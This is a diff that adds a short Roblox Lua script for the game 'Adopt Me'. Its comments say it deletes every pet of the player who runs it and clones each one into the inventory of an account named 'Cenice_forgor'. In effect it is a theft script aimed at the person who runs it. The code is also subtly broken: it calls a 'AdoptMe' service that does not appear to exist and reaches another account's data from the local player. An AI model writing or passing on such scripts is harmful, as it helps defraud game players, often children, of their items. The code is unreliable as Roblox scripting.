@@ -1,0 +1,30 @@
+-- Get a list of all players in the game
+local players = game:GetService("Players")
+
+-- Get the player who ran the script
+local player = players.LocalPlayer
+
+-- Get the "AdoptMe" service
+local adoptMe = game:GetService("AdoptMe")
+
+-- Get the "Store" object
+local store = adoptMe:WaitForChild("Store")
+
+-- Get the "PlayerData" object
+local playerData = adoptMe:WaitForChild("PlayerData")
+
+-- Get the "Pets" object
+local pets = playerData:WaitForChild("Pets")
+
+-- Iterate through all of the player's pets
+for i, pet in ipairs(pets:GetChildren()) do
+  -- Get the pet's data
+  local petData = pet:WaitForChild("Data")
+
+  -- Remove the pet from the player's inventory
+  pet:Destroy()
+
+  -- Clone the pet and add it to the "Cenice_forgor" account's inventory
+  local newPet = store:FindFirstChild(petData.Name):Clone()
+  newPet.Parent = playerData:FindFirstChild("Cenice_forgor").Backpack
+end
